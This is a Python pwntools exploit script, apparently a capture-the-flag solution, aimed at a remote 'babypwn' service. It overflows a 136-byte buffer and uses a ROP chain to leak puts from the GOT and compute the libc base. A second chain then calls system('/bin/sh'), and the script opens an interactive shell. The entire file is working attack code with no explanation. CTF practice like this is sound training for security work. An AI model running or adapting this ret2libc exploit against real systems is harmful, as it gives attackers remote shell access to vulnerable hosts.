#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
#context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./babypwn")
        self.libc = ELF("./libc.so.6")

    def start_binary(self):
#        self.p = process("./babypwn", env={
#            "LD_PRELOAD": "libc.so.6",
#        })
        self.p = remote("baby.uni.hctf.fun", 25251)
        self.p.recvuntil("/bin/sh\n")

    def leak_addr(self):
        puts_plt=self.e.plt["puts"]
        puts_got=self.e.got["puts"]
        main_addr=self.e.symbols["main"]
        pop_rdi=0x0000000000401203
        padding="A"*136

        rop=padding
        rop+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
        self.p.sendline(rop)
        data=self.p.recvuntil("/bin/sh\n")[0:6]
        print data
        return u64(data+"\x00"*2)

    def exec_system(self, libc_base):
        pop_rdi=0x0000000000401203
        bin_sh_addr=libc_base+next(self.libc.search('/bin/sh\x00'))
        system_addr=libc_base+self.libc.symbols["system"]
        padding="A"*136

        rop=padding
        rop+=p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)
        self.p.sendline(rop)
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        libc_leak=self.leak_addr()
        libc_base=libc_leak-self.libc.symbols["puts"]
        print "[x] Leak libc base address: "+hex(libc_base)

        self.exec_system(libc_base)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
